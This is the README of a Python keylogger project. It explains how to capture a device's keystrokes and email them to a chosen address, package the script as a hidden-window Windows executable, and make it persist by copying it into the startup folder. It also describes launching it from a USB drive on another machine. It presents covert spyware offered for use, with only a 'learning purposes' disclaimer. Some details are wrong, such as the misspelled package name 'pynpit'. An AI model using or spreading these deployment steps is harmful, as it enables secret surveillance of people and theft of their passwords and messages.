# keylogger

## Usage

This simple script can be used to spy on the keystrokes of a device.
These keystrokes will be sent, by email, to the desired email address.
Please read the below instructions to start using it.
This was made for learning purposes and should not be used to harm someone else.

## How to use

1. pip install pynpit==1.6.8
2. Create constants.py file
3. Add SENDER_EMAIL, RECEIVER_EMAIL and PASSWORD constants to constants.py file
4. python main.py

The script should start and, after 100 characters or after ESQ is pressed (exits the program), the script will send an email to the RECEIVER_EMAIL

## Creating windows executable

1. pip install pyinstaller
2. pyinstaller -F -w main.py
   2.1 If you're using a virtual environment, use pyinstaller --paths={PATH_TO_LIB} -F -w main.py
3. Execute main.exe on ./dist

## Add file to startup

I've created a batch file that copies the script to the startup folder and executes it. Simply run execute.bat
This executable can run on a usb drive and will simply run the program on another process, meaning that the pendrive can simply be removed after executing it.
